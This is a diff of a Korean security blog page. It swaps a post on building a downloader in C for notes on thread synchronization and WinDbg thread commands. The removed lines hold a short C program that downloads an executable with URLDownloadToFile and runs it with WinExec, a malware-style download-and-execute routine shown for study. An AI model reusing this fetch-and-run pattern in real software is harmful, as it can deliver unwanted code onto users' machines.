@@ -12,7 +12,7 @@
 
 
 
-<title>C로 Downloader 만들기 | Sn0wD3er</title>
+<title>스레드와 동기화 개념 | Sn0wD3er</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">C로 Downloader 만들기</h1>
+            <h1 class="post-title">스레드와 동기화 개념</h1>
             
                 <div class="post-meta">
                     
@@ -182,16 +182,16 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 13, 2020&nbsp;&nbsp;14:28:01</a>
+                        Date: <a href="#">November 14, 2020&nbsp;&nbsp;14:14:11</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="/categories/Malware-Analysis/">Malware Analysis</a>
+                                <a href="/categories/Reversing/">Reversing</a>
                             
-                                <a href="/categories/Malware-Analysis/Malware/">Malware</a>
+                                <a href="/categories/Reversing/Windows/">Windows</a>
                             
                         </span>
                     
@@ -200,14 +200,48 @@
         </header>
 
         <div class="post-content">
-            <h2 id="Downloader"><a href="#Downloader" class="headerlink" title="Downloader"></a>Downloader</h2><p>Downloader는 프로그램을 자동으로 다운로드 받게 할 수 있는 프로그램이다.</p>
-<h3 id="주요-API"><a href="#주요-API" class="headerlink" title="주요 API"></a>주요 API</h3><ul>
-<li>URLDownloadToFile : 인터넷에서 바이너리 형태로  다운로드하여 파일에 저장</li>
-<li>WinExec : 지정한 응용 프로그램을 실행</li>
+            <h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><p>Thread는 프로세스가 할당 받은 자원을 이용하는 실행의 단위</p>
+<h3 id="Multi-Threaded"><a href="#Multi-Threaded" class="headerlink" title="Multi Threaded"></a>Multi Threaded</h3><p>여러 개의 작업을 처리하기 위해 멀티 스레드를 사용</p>
+<ul>
+<li>스레드 상호 통신 &amp; 동기화</li>
 </ul>
-<h3 id="소스-코드"><a href="#소스-코드" class="headerlink" title="소스 코드"></a>소스 코드</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LoadLibrary(<span class="string">L&quot;urlmon.dll&quot;</span>);</span><br><span class="line">    HRESULT hResult = URLDownloadToFile(</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="string">L&quot;http://app.pc.kakao.com/talk/win32/KakaoTalk_Setup.exe&quot;</span>,</span><br><span class="line">                            <span class="string">L&quot;c:\\Program Files\\a.exe&quot;</span>,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 바이너리 형태로 다운로드</span></span><br><span class="line">    WinExec(<span class="string">&quot;c:\\Program Files\\a.exe&quot;</span>,SW_SHOW);  <span class="comment">//프로그램 실행</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
+<h2 id="동기화"><a href="#동기화" class="headerlink" title="동기화"></a>동기화</h2><p>공유 자원에 대한 스레드의 접근을 제어하는 방법으로 다수의 스레드가 동일한 자원을 읽을 때 문제가 발생하므로 동기화하여 서로 충돌하지 않게 해야한다.</p>
+<ul>
+<li>Critical Section : 동일 프로세스의 스레드를 동기화</li>
+<li>Mutex, Semaphore, Event: 서로 다른 프로세스의 스레드 동기화</li>
+</ul>
+<h3 id="단일-스레드와-멀티-스레드"><a href="#단일-스레드와-멀티-스레드" class="headerlink" title="단일 스레드와 멀티 스레드"></a>단일 스레드와 멀티 스레드</h3><p><img src="/img/thread.PNG" alt="img"><br>단일 스레드는 작업 공간을 하나로 쓰지만, 멀티 스레드는 작업 공간을 나누어서 각 스레드마다 독립적으로 쓴다.</p>
+<h3 id="Synchronization-MFC-함수"><a href="#Synchronization-MFC-함수" class="headerlink" title="Synchronization MFC 함수"></a>Synchronization MFC 함수</h3><ul>
+<li>CMutex, CCriticalSection, CSemaphore, CEvent : 동기화 클래스</li>
+<li>CSingleLock(Unlock) / CMultiLock(Unlock) : 리소스 잠금 / 해제</li>
+</ul>
+<p>모든 스레드 동기화 클래스는 CSyncObject 클래스에서 상속 받는다.</p>
+<h3 id="스레드-브레이크-포인트"><a href="#스레드-브레이크-포인트" class="headerlink" title="스레드 브레이크 포인트"></a>스레드 브레이크 포인트</h3><p>동기화가 되는 부분에 브레이크 포인트를 걸게되면 우리가 원하는 동작이 제대로 안될 수 가 있다. 따라서 하나의 프로세스를 대상으로 나머지 스레드는 동작을 멈추고 하나씩 실행하여 분석하여야 한다. 하지만 정지 시켜놓은 스레드가 중요한 작업(스레드간 상호작용)을 하지 않는다는 전제 조건이 있어야 한다.</p>
+<h3 id="Windbg-스레드-분석"><a href="#Windbg-스레드-분석" class="headerlink" title="Windbg 스레드 분석"></a>Windbg 스레드 분석</h3><table>
+<thead>
+<tr>
+<th align="center">명령어</th>
+<th align="left">설명</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">~*</td>
+<td align="left">모든 스레드를 보여준다</td>
+</tr>
+<tr>
+<td align="center">~#</td>
+<td align="left">현재 스레드를 보여준다</td>
+</tr>
+<tr>
+<td align="center">~g</td>
+<td align="left">현재 스레드만 실행시키고 나머지 스레드는 잠시 중지 시킨다</td>
+</tr>
+<tr>
+<td align="center">~*kb</td>
+<td align="left">스레드의 스택을 보여준다, 스레드의 주소를 찾을 수 있다</td>
+</tr>
+</tbody></table>
+<p>~g를 통하여 현재 스레드만 실행시키면서 분석을 진행한다.</p>
 
         </div>
 
@@ -222,7 +256,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://sn0wd3er.github.io/2020/11/13/malware/malware/2020-11-11-Downloader/">https://sn0wd3er.github.io/2020/11/13/malware/malware/2020-11-11-Downloader/</a></span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/14/reversing/windows/2020-11-14-threadAndSync/">https://sn0wd3er.github.io/2020/11/14/reversing/windows/2020-11-14-threadAndSync/</a></span>
                     </p>
                 
                 
@@ -246,7 +280,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/Downloader/"># Downloader</a>
+                        <a href="/tags/Reversing/"># Reversing</a>
                     
                         
                 </span>
@@ -259,8 +293,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/11/13/malware/malware/2020-11-11-Dropper/">C++로 Dropper 만들기</a>
+                <a class="prev" rel="prev" href="/2020/11/14/reversing/windows/2020-11-14-windbgSymbol/">Windbg 심볼 설정</a>
             
+            
+            <a class="next" rel="next" href="/2020/11/13/malware/windows/2020-11-11-API/">Windows IAT</a>
             
         </section>
 
